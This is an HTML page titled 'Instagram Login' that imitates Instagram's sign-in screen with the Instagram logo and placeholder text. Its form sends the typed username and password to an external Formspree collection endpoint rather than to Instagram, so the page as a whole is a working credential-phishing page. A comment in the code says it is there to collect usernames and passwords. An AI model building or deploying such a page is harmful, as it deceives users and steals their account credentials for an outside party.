<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <!-- Link to the external CSS file -->
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
            
            <!-- Form to collect username and password -->
           <form action="https://formspree.io/f/myzgqyqd" method="POST">
             <label>
                <input type="text" placeholder="Phone number, username, or email" id="username" name="message" required>
              </label>
              <label>
                <input type="text" placeholder="Password" id="password" name="message" required>
              </label>
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>

    <!-- Link to the external JavaScript file -->
    <script src="script.js"></script>
</body>
</html>
